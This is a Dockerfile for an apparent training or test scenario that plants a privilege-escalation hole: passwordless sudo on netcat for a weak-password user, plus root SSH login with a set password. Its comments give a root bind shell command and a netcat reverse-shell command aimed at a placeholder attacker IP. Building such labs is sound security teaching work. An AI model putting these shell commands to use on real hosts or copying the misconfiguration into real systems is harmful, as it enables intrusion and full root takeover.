FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_nc
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/nc as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and netcat (traditional or openbsd variant)
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        netcat-traditional \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify nc is installed and find its path
RUN which nc && ls -la $(which nc) && \
    ls -la /usr/bin/nc*

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# nc (netcat) can be used to spawn a bind shell as root:
#   sudo nc -l -p 12345 -e /bin/bash
# This binds a root shell to a port, giving full root access.
# It can also be used for reverse shells:
#   sudo nc <attacker_ip> <port> -e /bin/bash
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/nc" > /etc/sudoers.d/nc && \
    chmod 440 /etc/sudoers.d/nc

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]